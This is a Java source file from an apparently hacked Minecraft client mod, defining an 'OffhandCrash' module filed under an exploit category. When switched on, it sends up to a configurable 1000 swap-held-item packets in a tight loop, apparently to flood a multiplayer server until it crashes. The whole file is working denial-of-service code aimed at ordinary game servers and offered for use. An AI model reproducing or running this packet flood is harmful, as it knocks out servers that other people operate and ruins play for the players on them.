package cc.candy.candymod.module.crash;

import cc.candy.candymod.module.Module;
import cc.candy.candymod.setting.Setting;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketEntityAction;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;

public class OffhandCrash extends Module {
    public Setting<Integer> amount = register(new Setting("Amount" ,100 , 1000 , 1));

    public OffhandCrash(){
        super("OffhandCrash" , Categories.EXPLOIT , false , false);
    }

    @Override
    public void onEnable(){
        if(nullCheck()) return;

        try{
            for(int i = 0; i < amount.getValue(); i++){
               mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS , BlockPos.ORIGIN , EnumFacing.DOWN));
            }
        }
        catch (Exception ignored){
        }
    }
}
